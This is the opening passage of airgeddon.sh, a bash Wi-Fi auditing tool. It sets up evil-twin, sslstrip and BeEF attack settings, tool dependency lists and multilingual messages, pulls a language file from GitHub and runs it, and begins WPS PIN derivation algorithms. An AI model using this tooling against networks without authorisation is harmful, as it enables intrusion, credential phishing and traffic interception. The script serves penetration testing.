#!/usr/bin/env bash
#Title........: airgeddon.sh
#Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
#Author.......: v1s1t0r
#Date.........: 20170916
#Version......: 7.21
#Usage........: bash airgeddon.sh
#Bash Version.: 4.2 or later

#Enabled with extra-verbose mode 2 / Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
debug_mode=0

#Enabled 1 / Disabled 0 - Auto update feature (it has no effect on debug mode) - Default value 1
auto_update=1

#Enabled 1 / Disabled 0 - Auto change language feature - Default value 1
auto_change_language=1

#Enabled 1 / Disabled 0 - Allow colorized output - Default value 1
allow_colorization=1

#Language vars
#Change this line to select another default language. Select one from available values in array
language="ENGLISH"
declare -A lang_association=(
								["en"]="ENGLISH"
								["es"]="SPANISH"
								["fr"]="FRENCH"
								["ca"]="CATALAN"
								["pt"]="PORTUGUESE"
								["ru"]="RUSSIAN"
								["gr"]="GREEK"
								["it"]="ITALIAN"
							)

#Tools vars
essential_tools_names=(
						"ifconfig"
						"iwconfig"
						"iw"
						"awk"
						"airmon-ng"
						"airodump-ng"
						"aircrack-ng"
						"xterm"
					)

optional_tools_names=(
						"wpaclean"
						"crunch"
						"aireplay-ng"
						"mdk3"
						"hashcat"
						"hostapd"
						"dhcpd"
						"iptables"
						"ettercap"
						"etterlog"
						"sslstrip"
						"lighttpd"
						"dnsspoof"
						"wash"
						"reaver"
						"bully"
						"pixiewps"
						"unbuffer"
						"bettercap"
						"beef"
						"packetforge-ng"
					)

update_tools=("curl")

declare -A possible_package_names=(
									[${essential_tools_names[0]}]="net-tools" #ifconfig
									[${essential_tools_names[1]}]="wireless-tools / wireless_tools" #iwconfig
									[${essential_tools_names[2]}]="iw" #iw
									[${essential_tools_names[3]}]="awk / gawk" #awk
									[${essential_tools_names[4]}]="aircrack-ng" #airmon-ng
									[${essential_tools_names[5]}]="aircrack-ng" #airodump-ng
									[${essential_tools_names[6]}]="aircrack-ng" #aircrack-ng
									[${essential_tools_names[7]}]="xterm" #xterm
									[${optional_tools_names[0]}]="aircrack-ng" #wpaclean
									[${optional_tools_names[1]}]="crunch" #crunch
									[${optional_tools_names[2]}]="aircrack-ng" #aireplay-ng
									[${optional_tools_names[3]}]="mdk3" #mdk3
									[${optional_tools_names[4]}]="hashcat" #hashcat
									[${optional_tools_names[5]}]="hostapd" #hostapd
									[${optional_tools_names[6]}]="isc-dhcp-server / dhcp-server / dhcp" #dhcpd
									[${optional_tools_names[7]}]="iptables" #iptables
									[${optional_tools_names[8]}]="ettercap / ettercap-text-only / ettercap-graphical" #ettercap
									[${optional_tools_names[9]}]="ettercap / ettercap-text-only / ettercap-graphical" #etterlog
									[${optional_tools_names[10]}]="sslstrip" #sslstrip
									[${optional_tools_names[11]}]="lighttpd" #lighttpd
									[${optional_tools_names[12]}]="dsniff" #dnsspoof
									[${optional_tools_names[13]}]="reaver" #wash
									[${optional_tools_names[14]}]="reaver" #reaver
									[${optional_tools_names[15]}]="bully" #bully
									[${optional_tools_names[16]}]="pixiewps" #pixiewps
									[${optional_tools_names[17]}]="expect / expect-dev" #unbuffer
									[${optional_tools_names[18]}]="bettercap" #bettercap
									[${optional_tools_names[19]}]="beef-xss / beef-project" #beef
									[${optional_tools_names[20]}]="aircrack-ng" #packetforge-ng
									[${update_tools[0]}]="curl" #curl
								)

#More than one alias can be defined separated by spaces at value
declare -A possible_alias_names=(
									["beef"]="beef-xss beef-server"
								)

#General vars
airgeddon_version="7.21"
language_strings_expected_version="7.21-1"
standardhandshake_filename="handshake-01.cap"
tmpdir="/tmp/"
osversionfile_dir="/etc/"
minimum_bash_version_required="4.2"
resume_message=224
abort_question=12
pending_of_translation="[PoT]"
escaped_pending_of_translation="\[PoT\]"
standard_resolution="1024x768"
curl_404_error="404: Not Found"
language_strings_file="language_strings.sh"
broadcast_mac="FF:FF:FF:FF:FF:FF"

#aircrack vars
aircrack_tmp_simple_name_file="aircrack"
aircrack_pot_tmp="${aircrack_tmp_simple_name_file}.pot"

#hashcat vars
hashcat3_version="3.0"
hashcat_hccapx_version="3.40"
hashcat_tmp_simple_name_file="hctmp"
hashcat_tmp_file="${hashcat_tmp_simple_name_file}.hccap"
hashcat_pot_tmp="${hashcat_tmp_simple_name_file}.pot"
hashcat_output_file="${hashcat_tmp_simple_name_file}.out"
hccapx_tool="cap2hccapx"
possible_hccapx_converter_known_locations=(
										"/usr/lib/hashcat-utils/${hccapx_tool}.bin"
									)

#WEP vars
wep_data="wepdata"
wepdir="wep/"
wep_attack_file="ag.wep.sh"
wep_key_handler="ag.wep_key_handler.sh"
wep_processes_file="wep_processes"

#Docker vars
docker_based_distro="Kali"
docker_io_dir="/io"

#WPS vars
minimum_reaver_pixiewps_version="1.5.2"
minimum_bully_pixiewps_version="1.1"
minimum_bully_verbosity4_version="1.1"
known_pins_dbfile="known_pins.db"
pins_dbfile_checksum="pindb_checksum.txt"
wps_default_generic_pin="12345670"
wps_attack_script_file="ag.wpsattack.sh"
wps_out_file="ag.wpsout.txt"
timeout_secs_per_pin="30"
timeout_secs_per_pixiedust="30"

#Repository and contact vars
repository_hostname="github.com"
github_user="v1s1t0r1sh3r3"
github_repository="airgeddon"
branch="master"
script_filename="airgeddon.sh"
urlgithub="https://${repository_hostname}/${github_user}/${github_repository}"
urlscript_directlink="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${script_filename}"
urlscript_pins_dbfile="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${known_pins_dbfile}"
urlscript_pins_dbfile_checksum="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${pins_dbfile_checksum}"
urlscript_language_strings_file="https://raw.githubusercontent.com/${github_user}/${github_repository}/${branch}/${language_strings_file}"
urlgithub_wiki="https://${repository_hostname}/${github_user}/${github_repository}/wiki"
bitcoin="1AKnTXbomtwUzrm81FRzi5acSSXxGteGTH"
mail="v1s1t0r.1s.h3r3@gmail.com"
author="v1s1t0r"

#Dhcpd, Hostapd and misc Evil Twin vars
ip_range="192.168.1.0"
alt_ip_range="172.16.250.0"
router_ip="192.168.1.1"
alt_router_ip="172.16.250.1"
broadcast_ip="192.168.1.255"
alt_broadcast_ip="172.16.250.255"
range_start="192.168.1.33"
range_stop="192.168.1.100"
alt_range_start="172.16.250.33"
alt_range_stop="172.16.250.100"
std_c_mask="255.255.255.0"
ip_mask="255.255.255.255"
dhcpd_file="ag.dhcpd.conf"
internet_dns1="8.8.8.8"
internet_dns2="8.8.4.4"
internet_dns3="139.130.4.5"
sslstrip_port="10000"
bettercap_proxy_port="8080"
bettercap_dns_port="5300"
minimum_bettercap_advanced_options="1.5.9"
sslstrip_file="ag.sslstrip.log"
ettercap_file="ag.ettercap.log"
bettercap_file="ag.bettercap.log"
beef_port="3000"
beef_control_panel_url="http://127.0.0.1:${beef_port}/ui/panel"
jshookfile="hook.js"
beef_file="ag.beef.conf"
beef_pass="airgeddon"
beef_db="beef.db"
beef_installation_url="https://github.com/beefproject/beef/wiki/Installation"
hostapd_file="ag.hostapd.conf"
control_file="ag.control.sh"
webserver_file="ag.lighttpd.conf"
webdir="www/"
indexfile="index.htm"
checkfile="check.htm"
cssfile="portal.css"
jsfile="portal.js"
attemptsfile="ag.et_attempts.txt"
currentpassfile="ag.et_currentpass.txt"
successfile="ag.et_success.txt"
processesfile="ag.et_processes.txt"
possible_dhcp_leases_files=(
								"/var/lib/dhcp/dhcpd.leases"
								"/var/state/dhcp/dhcpd.leases"
								"/var/lib/dhcpd/dhcpd.leases"
							)
possible_beef_known_locations=(
									"/usr/share/beef/"
									"/usr/share/beef-xss/"
									"/opt/beef/"
									"/opt/beef-project/"
									#Custom BeEF location (set=0)
								)

#Connection vars
ips_to_check_internet=(
						"${internet_dns1}"
						"${internet_dns2}"
						"${internet_dns3}"
					)

#Distros vars
known_compatible_distros=(
							"Wifislax"
							"Kali"
							"Parrot"
							"Backbox"
							"BlackArch"
							"Cyborg"
							"Ubuntu"
							"Debian"
							"SuSE"
							"CentOS"
							"Gentoo"
							"Fedora"
							"Red Hat"
							"Arch"
							"OpenMandriva"
						)

known_arm_compatible_distros=(
								"Raspbian"
								"Parrot arm"
								"Kali arm"
							)

#Hint vars
declare main_hints=(128 134 163 437 438 442 445)
declare dos_hints=(129 131 133)
declare handshake_hints=(127 130 132 136)
declare handshake_attack_hints=(142)
declare decrypt_hints=(171 178 179 208 244 163)
declare select_interface_hints=(246)
declare language_hints=(250 438)
declare option_hints=(445 250 448 477)
declare evil_twin_hints=(254 258 264 269 309 328 400)
declare evil_twin_dos_hints=(267 268)
declare beef_hints=(408)
declare wps_hints=(342 343 344 356 369 390)
declare wep_hints=(431 429 428 432 433)

#Charset vars
crunch_lowercasecharset="abcdefghijklmnopqrstuvwxyz"
crunch_uppercasecharset="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
crunch_numbercharset="0123456789"
crunch_symbolcharset="!#$%/=?{}[]-*:;"
hashcat_charsets=("?l" "?u" "?d" "?s")

#Colors vars
green_color="\033[1;32m"
green_color_title="\033[0;32m"
red_color="\033[1;31m"
red_color_slim="\033[0;031m"
blue_color="\033[1;34m"
cyan_color="\033[1;36m"
brown_color="\033[0;33m"
yellow_color="\033[1;33m"
pink_color="\033[1;35m"
white_color="\e[1;97m"
normal_color="\e[1;0m"

#Check coherence between script and language_strings file
function check_language_strings() {

	debug_print

	if [ -f "${scriptfolder}${language_strings_file}" ]; then

		language_file_found=1
		language_file_mismatch=0
		#shellcheck source=./language_strings.sh
		source "${scriptfolder}${language_strings_file}"
		set_language_strings_version
		if [ "${language_strings_version}" != "${language_strings_expected_version}" ]; then
			language_file_mismatch=1
		fi
	else
		language_file_found=0
	fi

	if [[ "${language_file_found}" -eq 0 ]] || [[ "${language_file_mismatch}" -eq 1 ]]; then

		language_strings_handling_messages

		generate_dynamic_line "airgeddon" "title"
		if [ "${language_file_found}" -eq 0 ]; then
			echo_red "${language_strings_no_file[${language}]}"
			if [ "${airgeddon_version}" = "6.1" ]; then
				echo
				echo_yellow "${language_strings_first_time[${language}]}"
			fi
		elif [ "${language_file_mismatch}" -eq 1 ]; then
			echo_red "${language_strings_file_mismatch[${language}]}"
		fi

		echo
		echo_blue "${language_strings_try_to_download[${language}]}"
		read -p "${language_strings_key_to_continue[${language}]}" -r

		if check_repository_access; then

			if download_language_strings_file; then
				echo
				echo_yellow "${language_strings_successfully_downloaded[${language}]}"
				read -p "${language_strings_key_to_continue[${language}]}" -r
				clear
				return 0
			else
				echo
				echo_red "${language_strings_failed_downloading[${language}]}"
			fi
		else
			echo
			echo_red "${language_strings_failed_downloading[${language}]}"
		fi

		echo
		echo_blue "${language_strings_exiting[${language}]}"
		echo
		hardcore_exit
	fi
}

#Download the language strings file
function download_language_strings_file() {

	debug_print

	local lang_file_downloaded=0
	remote_language_strings_file=$(timeout -s SIGTERM 15 curl -L ${urlscript_language_strings_file} 2> /dev/null)

	if [[ -n "${remote_language_strings_file}" ]] && [[ "${remote_language_strings_file}" != "${curl_404_error}" ]]; then
		lang_file_downloaded=1
	else
		http_proxy_detect
		if [ "${http_proxy_set}" -eq 1 ]; then

			remote_language_strings_file=$(timeout -s SIGTERM 15 curl --proxy "${http_proxy}" -L ${urlscript_language_strings_file} 2> /dev/null)
			if [[ -n "${remote_language_strings_file}" ]] && [[ "${remote_language_strings_file}" != "${curl_404_error}" ]]; then
				lang_file_downloaded=1
			fi
		fi
	fi

	if [ "${lang_file_downloaded}" -eq 1 ]; then
		echo "${remote_language_strings_file}" > "${scriptfolder}${language_strings_file}"
		chmod +x "${scriptfolder}${language_strings_file}" > /dev/null 2>&1
		#shellcheck source=./language_strings.sh
		source "${scriptfolder}${language_strings_file}"
		return 0
	else
		return 1
	fi
}

#Set messages for language_strings handling
function language_strings_handling_messages() {

	declare -gA language_strings_no_file
	language_strings_no_file["ENGLISH"]="Error. Language strings file not found"
	language_strings_no_file["SPANISH"]="Error. No se ha encontrado el fichero de traducciones"
	language_strings_no_file["FRENCH"]="Erreur. Fichier contenant les traductions absent"
	language_strings_no_file["CATALAN"]="Error. No s'ha trobat el fitxer de traduccions"
	language_strings_no_file["PORTUGUESE"]="Erro. O arquivo de tradução não foi encontrado"
	language_strings_no_file["RUSSIAN"]="Ошибка. Не найден языковой файл"
	language_strings_no_file["GREEK"]="Σφάλμα. Το αρχείο γλωσσών δεν βρέθηκε"
	language_strings_no_file["ITALIAN"]="Errore. Non si trova il file delle traduzioni"

	declare -gA language_strings_file_mismatch
	language_strings_file_mismatch["ENGLISH"]="Error. The language strings file found mismatches expected version"
	language_strings_file_mismatch["SPANISH"]="Error. El fichero de traducciones encontrado no es la versión esperada"
	language_strings_file_mismatch["FRENCH"]="Erreur. Les traductions trouvées ne sont pas celles attendues"
	language_strings_file_mismatch["CATALAN"]="Error. El fitxer de traduccions trobat no és la versió esperada"
	language_strings_file_mismatch["PORTUGUESE"]="Erro. O a versão do arquivos de tradução encontrado é a incompatível"
	language_strings_file_mismatch["RUSSIAN"]="Ошибка. Языковой файл не соответствует ожидаемой версии"
	language_strings_file_mismatch["GREEK"]="Σφάλμα. Το αρχείο γλωσσών που έχει βρεθεί δεν αντιστοιχεί με την προαπαιτούμενη έκδοση"
	language_strings_file_mismatch["ITALIAN"]="Errore. Il file delle traduzioni trovato non è la versione prevista"

	declare -gA language_strings_try_to_download
	language_strings_try_to_download["ENGLISH"]="airgeddon will try to download the language strings file..."
	language_strings_try_to_download["SPANISH"]="airgeddon intentará descargar el fichero de traducciones..."
	language_strings_try_to_download["FRENCH"]="airgeddon va essayer de télécharger les fichiers de traductions..."
	language_strings_try_to_download["CATALAN"]="airgeddon intentarà descarregar el fitxer de traduccions..."
	language_strings_try_to_download["PORTUGUESE"]="O airgeddon tentará baixar o arquivo de tradução..."
	language_strings_try_to_download["RUSSIAN"]="airgeddon попытается загрузить языковой файл..."
	language_strings_try_to_download["GREEK"]="Το airgeddon θα προσπαθήσει να κατεβάσει το αρχείο γλωσσών..."
	language_strings_try_to_download["ITALIAN"]="airgeddon cercherá di scaricare il file delle traduzioni..."

	declare -gA language_strings_successfully_downloaded
	language_strings_successfully_downloaded["ENGLISH"]="Language strings file was successfully downloaded"
	language_strings_successfully_downloaded["SPANISH"]="Se ha descargado con éxito el fichero de traducciones"
	language_strings_successfully_downloaded["FRENCH"]="Les fichiers traduction ont été correctement téléchargés"
	language_strings_successfully_downloaded["CATALAN"]="S'ha descarregat amb èxit el fitxer de traduccions"
	language_strings_successfully_downloaded["PORTUGUESE"]="O arquivo de tradução foi baixado com sucesso"
	language_strings_successfully_downloaded["RUSSIAN"]="Языковой файл был успешно загружен"
	language_strings_successfully_downloaded["GREEK"]="Το αρχείο γλωσσών κατέβηκε με επιτυχία"
	language_strings_successfully_downloaded["ITALIAN"]="Il file delle traduzioni è stato scaricato con successo"

	declare -gA language_strings_failed_downloading
	language_strings_failed_downloading["ENGLISH"]="The language string file can't be downloaded. Check your internet connection or download it manually from ${normal_color}${urlgithub}"
	language_strings_failed_downloading["SPANISH"]="No se ha podido descargar el fichero de traducciones. Comprueba tu conexión a internet o descárgalo manualmente de ${normal_color}${urlgithub}"
	language_strings_failed_downloading["FRENCH"]="Impossible de télécharger le fichier traduction. Vérifiez votre connexion à internet ou téléchargez le fichier manuellement ${normal_color}${urlgithub}"
	language_strings_failed_downloading["CATALAN"]="No s'ha pogut descarregar el fitxer de traduccions. Comprova la connexió a internet o descarrega'l manualment de ${normal_color}${urlgithub}"
	language_strings_failed_downloading["PORTUGUESE"]="Não foi possível baixar o arquivos de tradução. Verifique a sua conexão com a internet ou baixe manualmente em ${normal_color}${urlgithub}"
	language_strings_failed_downloading["RUSSIAN"]="Языковой файл не может быть загружен. Проверьте подключение к Интернету или загрузите его вручную с ${normal_color}${urlgithub}"
	language_strings_failed_downloading["GREEK"]="Το αρχείο γλωσσών δεν μπορεί να κατέβει. Ελέγξτε τη σύνδεση σας με το διαδίκτυο ή κατεβάστε το χειροκίνητα ${normal_color}${urlgithub}"
	language_strings_failed_downloading["ITALIAN"]="Impossibile scaricare il file delle traduzioni. Controlla la tua connessione a internet o scaricalo manualmente ${normal_color}${urlgithub}"

	declare -gA language_strings_first_time
	language_strings_first_time["ENGLISH"]="If you are seeing this message after an automatic update, don't be scared! It's probably because airgeddon has different file structure since version 6.1. It will be automatically fixed"
	language_strings_first_time["SPANISH"]="Si estás viendo este mensaje tras una actualización automática, ¡no te asustes! probablemente es porque a partir de la versión 6.1 la estructura de ficheros de airgeddon ha cambiado. Se reparará automáticamente"
	language_strings_first_time["FRENCH"]="Si vous voyez ce message après une mise à jour automatique ne vous inquiétez pas! A partir de la version 6.1 la structure de fichier d'airgeddon a changé. L'ajustement se fera automatiquement"
	language_strings_first_time["CATALAN"]="Si estàs veient aquest missatge després d'una actualització automàtica, no t'espantis! probablement és perquè a partir de la versió 6.1 l'estructura de fitxers de airgeddon ha canviat. Es repararà automàticament"
	language_strings_first_time["PORTUGUESE"]="Se você está vendo esta mensagem depois de uma atualização automática, não tenha medo! A partir da versão 6.1 da estrutura de arquivos do airgeddon mudou. Isso será corrigido automaticamente"
	language_strings_first_time["RUSSIAN"]="Если вы видите это сообщение после автоматического обновления, не переживайте! Вероятно, это объясняется тем, что, начиная с версии 6.1, airgeddon имеет другую структуру файлов. Проблема будет разрешена автоматически"
	language_strings_first_time["GREEK"]="Εάν βλέπετε αυτό το μήνυμα μετά από κάποια αυτόματη ενημέρωση, μην τρομάξετε! Πιθανόν είναι λόγω της διαφορετικής δομής του airgeddon μετά από την έκδοση 6.1. Θα επιδιορθωθεί αυτόματα"
	language_strings_first_time["ITALIAN"]="Se stai vedendo questo messaggio dopo un aggiornamento automatico, niente panico! probabilmente è perché a partire dalla versione 6.1 é cambiata la struttura dei file di airgeddon. Sarà riparato automaticamente"

	declare -gA language_strings_exiting
	language_strings_exiting["ENGLISH"]="Exiting airgeddon script v${airgeddon_version} - See you soon! :)"
	language_strings_exiting["SPANISH"]="Saliendo de airgeddon script v${airgeddon_version} - Nos vemos pronto! :)"
	language_strings_exiting["FRENCH"]="Fermeture du script airgeddon v${airgeddon_version} - A bientôt! :)"
	language_strings_exiting["CATALAN"]="Sortint de airgeddon script v${airgeddon_version} - Ens veiem aviat! :)"
	language_strings_exiting["PORTUGUESE"]="Saindo do script airgeddon v${airgeddon_version} - Até breve! :)"
	language_strings_exiting["RUSSIAN"]="Выход из скрипта airgeddon v${airgeddon_version} - До встречи! :)"
	language_strings_exiting["GREEK"]="Κλείσιμο του airgeddon v${airgeddon_version} - Αντίο :)"
	language_strings_exiting["ITALIAN"]="Uscendo dallo script airgeddon v${airgeddon_version} - A presto! :)"

	declare -gA language_strings_key_to_continue
	language_strings_key_to_continue["ENGLISH"]="Press [Enter] key to continue..."
	language_strings_key_to_continue["SPANISH"]="Pulsa la tecla [Enter] para continuar..."
	language_strings_key_to_continue["FRENCH"]="Pressez [Enter] pour continuer..."
	language_strings_key_to_continue["CATALAN"]="Prem la tecla [Enter] per continuar..."
	language_strings_key_to_continue["PORTUGUESE"]="Pressione a tecla [Enter] para continuar..."
	language_strings_key_to_continue["RUSSIAN"]="Нажмите клавишу [Enter] для продолжения..."
	language_strings_key_to_continue["GREEK"]="Πατήστε το κουμπί [Enter] για να συνεχίσετε..."
	language_strings_key_to_continue["ITALIAN"]="Premere il tasto [Enter] per continuare..."
}

#Toggle language auto-detection feature
function auto_change_language_toggle() {

	debug_print

	if [ "${auto_change_language}" -eq 1 ]; then
		sed -ri 's:(auto_change_language)=(1):\1=0:' "${scriptfolder}${scriptname}" 2> /dev/null
		if ! grep -E "auto_[c]hange_language=0" "${scriptfolder}${scriptname}" > /dev/null; then
			return 1
		fi
		auto_change_language=$((auto_change_language-1))
	else
		sed -ri 's:(auto_change_language)=(0):\1=1:' "${scriptfolder}${scriptname}" 2> /dev/null
		if ! grep -E "auto_[c]hange_language=1" "${scriptfolder}${scriptname}" > /dev/null; then
			return 1
		fi
		auto_change_language=$((auto_change_language+1))
	fi
	return 0
}

#Toggle allow colorization feature
function allow_colorization_toggle() {

	debug_print

	if [ "${allow_colorization}" -eq 1 ]; then
		sed -ri 's:(allow_colorization)=(1):\1=0:' "${scriptfolder}${scriptname}" 2> /dev/null
		if ! grep -E "allow_[c]olorization=0" "${scriptfolder}${scriptname}" > /dev/null; then
			return 1
		fi
		allow_colorization=$((allow_colorization-1))
	else
		sed -ri 's:(allow_colorization)=(0):\1=1:' "${scriptfolder}${scriptname}" 2> /dev/null
		if ! grep -E "allow_[c]olorization=1" "${scriptfolder}${scriptname}" > /dev/null; then
			return 1
		fi
		allow_colorization=$((allow_colorization+1))
	fi
	initialize_colorized_output
	return 0
}

#Toggle auto-update feature
function auto_update_toggle() {

	debug_print

	if [ "${auto_update}" -eq 1 ]; then
		sed -ri 's:(auto_update)=(1):\1=0:' "${scriptfolder}${scriptname}" 2> /dev/null
		if ! grep -E "auto_[u]pdate=0" "${scriptfolder}${scriptname}" > /dev/null; then
			return 1
		fi
		auto_update=$((auto_update-1))
	else
		sed -ri 's:(auto_update)=(0):\1=1:' "${scriptfolder}${scriptname}" 2> /dev/null
		if ! grep -E "auto_[u]pdate=1" "${scriptfolder}${scriptname}" > /dev/null; then
			return 1
		fi
		auto_update=$((auto_update+1))
	fi
	return 0
}

#Get current permanent language
function get_current_permanent_language() {

	debug_print

	current_permanent_language=$(grep "language=" "${scriptfolder}${scriptname}" | grep -v "auto_change_language" | head -n 1 | awk -F "=" '{print $2}')
	current_permanent_language=$(echo "${current_permanent_language}" | sed -e 's/^"//;s/"$//')
}

#Set language as permanent
function set_permanent_language() {

	debug_print

	sed -ri "s:^([l]anguage)=\"[a-zA-Z]+\":\1=\"${language}\":" "${scriptfolder}${scriptname}" 2> /dev/null
	if ! grep -E "^[l]anguage=\"${language}\"" "${scriptfolder}${scriptname}" > /dev/null; then
		return 1
	fi
	return 0
}

#Print the current line of where this was called and the function's name. Applies to some (which are useful) functions
function debug_print() {

	if [ ${debug_mode} -eq 2 ]; then

		declare excluded_functions=(
								"ask_yesno"
								"check_pending_of_translation"
								"contains_element"
								"echo_blue"
								"echo_brown"
								"echo_cyan"
								"echo_green"
								"echo_green_title"
								"echo_pink"
								"echo_red"
								"echo_red_slim"
								"echo_white"
								"echo_yellow"
								"generate_dynamic_line"
								"interrupt_checkpoint"
								"language_strings"
								"last_echo"
								"print_hint"
								"print_large_separator"
								"print_simple_separator"
								"read_yesno"
								"remove_warnings"
								"special_text_missed_optional_tool"
								"store_array"
								"under_construction_message"
							)

		if (IFS=$'\n'; echo "${excluded_functions[*]}") | grep -qFx "${FUNCNAME[1]}"; then
			return 1
		fi

		echo "Line:${BASH_LINENO[1]}" "${FUNCNAME[1]}"
		return 0
	fi
}

#Set the message to show again after an interrupt ([Ctrl+C] or [Ctrl+Z]) without exiting
function interrupt_checkpoint() {

	debug_print

	if [ -z "${last_buffered_type1}" ]; then
		last_buffered_message1=${1}
		last_buffered_message2=${1}
		last_buffered_type1=${2}
		last_buffered_type2=${2}
	else
		if [ "${1}" -ne ${resume_message} ]; then
			last_buffered_message2=${last_buffered_message1}
			last_buffered_message1=${1}
			last_buffered_type2=${last_buffered_type1}
			last_buffered_type1=${2}
		fi
	fi
}

#Add the text on a menu when you miss an optional tool
function special_text_missed_optional_tool() {

	debug_print

	declare -a required_tools=("${!3}")

	allowed_menu_option=1
	if [ ${debug_mode} -eq 0 ]; then
		tools_needed="${optionaltool_needed[${1}]}"
		for item in "${required_tools[@]}"; do
			if [ "${optional_tools[${item}]}" -eq 0 ]; then
				allowed_menu_option=0
				tools_needed+="${item} "
			fi
		done
	fi

	if [ ${allowed_menu_option} -eq 1 ]; then
		last_echo "${arr[${1},${2}]}" "${normal_color}"
	else
		[[ ${arr[${1},${2}]} =~ ^([0-9]+)\.(.*)$ ]] && forbidden_options+=("${BASH_REMATCH[1]}")
		tools_needed=${tools_needed:: -1}
		echo_red_slim "${arr[${1},${2}]} (${tools_needed})"
	fi
}

#Generate the chars in front of and behind a text for titles and separators
function generate_dynamic_line() {

	debug_print

	local type=${2}
	if [ "${type}" = "title" ]; then
		ncharstitle=78
		titlechar="*"
	elif [ "${type}" = "separator" ]; then
		ncharstitle=58
		titlechar="-"
	fi

	titletext=${1}
	titlelength=${#titletext}
	finaltitle=""

	for ((i=0; i < (ncharstitle/2 - titlelength+(titlelength/2)); i++)); do
		finaltitle="${finaltitle}${titlechar}"
	done

	if [ "${type}" = "title" ]; then
		finaltitle="${finaltitle} ${titletext} "
	elif [ "${type}" = "separator" ]; then
		finaltitle="${finaltitle} (${titletext}) "
	fi

	for ((i=0; i < (ncharstitle/2 - titlelength+(titlelength/2)); i++)); do
		finaltitle="${finaltitle}${titlechar}"
	done

	if [ $((titlelength % 2)) -gt 0 ]; then
		finaltitle+="${titlechar}"
	fi

	if [ "${type}" = "title" ]; then
		echo_green_title "${finaltitle}"
	elif [ "${type}" = "separator" ]; then
		echo_blue "${finaltitle}"
	fi
}

#Wrapper to check managed mode on an interface
function check_to_set_managed() {

	debug_print

	check_interface_mode
	case "${ifacemode}" in
		"Managed")
			echo
			language_strings "${language}" 0 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings "${language}" 1 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
	esac
	return 0
}

#Wrapper to check monitor mode on an interface
function check_to_set_monitor() {

	debug_print

	check_interface_mode
	case "${ifacemode}" in
		"Monitor")
			echo
			language_strings "${language}" 10 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings "${language}" 13 "red"
			language_strings "${language}" 115 "read"
			return 1
		;;
	esac
	return 0
}

#Check for monitor mode on an interface
function check_monitor_enabled() {

	debug_print

	mode=$(iwconfig "${interface}" 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2)

	if [[ ${mode} != "Monitor" ]]; then
		echo
		language_strings "${language}" 14 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi
	return 0
}

#Check if an interface is a wifi card or not
function check_interface_wifi() {

	debug_print

	execute_iwconfig_fix
	return $?
}

#Execute the iwconfig fix to know if an interface is a wifi card or not
function execute_iwconfig_fix() {

	debug_print

	iwconfig_fix
	iwcmd="iwconfig ${interface} ${iwcmdfix} > /dev/null 2> /dev/null"
	eval "${iwcmd}"

	return $?
}

#Create a list of interfaces associated to its macs
function renew_ifaces_and_macs_list() {

	debug_print

	readarray -t IFACES_AND_MACS < <(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep lo -v | grep "${interface}" -v)
	declare -gA ifaces_and_macs
	for iface_name in "${IFACES_AND_MACS[@]}"; do
		mac_item=$(cat "/sys/class/net/${iface_name}/address" 2> /dev/null)
		if [ -n "${mac_item}" ]; then
			ifaces_and_macs[${iface_name}]=${mac_item}
		fi
	done

	declare -gA ifaces_and_macs_switched
	for iface_name in "${!ifaces_and_macs[@]}"; do
		ifaces_and_macs_switched[${ifaces_and_macs[${iface_name}]}]=${iface_name}
	done
}

#Check the interface coherence between interface names and macs
function check_interface_coherence() {

	debug_print

	renew_ifaces_and_macs_list
	interface_auto_change=0

	interface_found=0
	for iface_name in "${!ifaces_and_macs[@]}"; do
		if [ "${interface}" = "${iface_name}" ]; then
			interface_found=1
			interface_mac=${ifaces_and_macs[${iface_name}]}
			break
		fi
	done

	if [ ${interface_found} -eq 0 ]; then
		for iface_mac in "${ifaces_and_macs[@]}"; do
			iface_mac_tmp=${iface_mac:0:15}
			interface_mac_tmp=${interface_mac:0:15}
			if [ "${iface_mac_tmp}" = "${interface_mac_tmp}" ]; then
				interface=${ifaces_and_macs_switched[${iface_mac}]}
				interface_auto_change=1
				break
			fi
		done
	fi

	return ${interface_auto_change}
}

#Add contributing footer to a file
function add_contributing_footer_to_file() {

	debug_print

	{
	echo ""
	echo "---------------"
	echo ""
	echo "${footer_texts[${language},1]}"
	} >> "${1}"
}

#Prepare the vars to be used on wps pin database attacks
function set_wps_mac_parameters() {

	debug_print

	six_wpsbssid_first_digits=${wps_bssid:0:8}
	six_wpsbssid_first_digits_clean=${six_wpsbssid_first_digits//:}
	six_wpsbssid_last_digits=${wps_bssid: -8}
	six_wpsbssid_last_digits_clean=${six_wpsbssid_last_digits//:}
	four_wpsbssid_last_digits=${wps_bssid: -5}
	four_wpsbssid_last_digits_clean=${four_wpsbssid_last_digits//:}
}

#Calculate pin based on Zhao Chunsheng algorithm (computepin), step 1
function calculate_computepin_algorithm_step1() {

	debug_print

	hex_to_dec=$(printf '%d\n' 0x"${six_wpsbssid_last_digits_clean}") 2> /dev/null
	computepin_pin=$((hex_to_dec % 10000000))
}

#Calculate pin based on Zhao Chunsheng algorithm (computepin), step 2
function calculate_computepin_algorithm_step2() {

	debug_print

	computepin_pin=$(printf '%08d\n' $((10#${computepin_pin} * 10 + checksum_digit)))
}

#Calculate pin based on Stefan Viehböck algorithm (easybox)
function calculate_easybox_algorithm() {

	debug_print

	hex_to_dec=($(printf "%04d" "0x${four_wpsbssid_last_digits_clean}" | sed 's/.*\(....\)/\1/;s/./& /g'))
	[[ ${four_wpsbssid_last_digits_clean} =~ ${four_wpsbssid_last_digits_clean//?/(.)} ]] && hexi=($(printf '%s\n' "${BASH_REMATCH[*]:1}"))

	c1=$(printf "%d + %d + %d + %d" "${hex_to_dec[0]}" "${hex_to_dec[1]}" "0x${hexi[2]}" "0x${hexi[3]}")
	c2=$(printf "%d + %d + %d + %d" "0x${hexi[0]}" "0x${hexi[1]}" "${hex_to_dec[2]}" "${hex_to_dec[3]}")

	K1=$((c1 % 16))
	K2=$((c2 % 16))
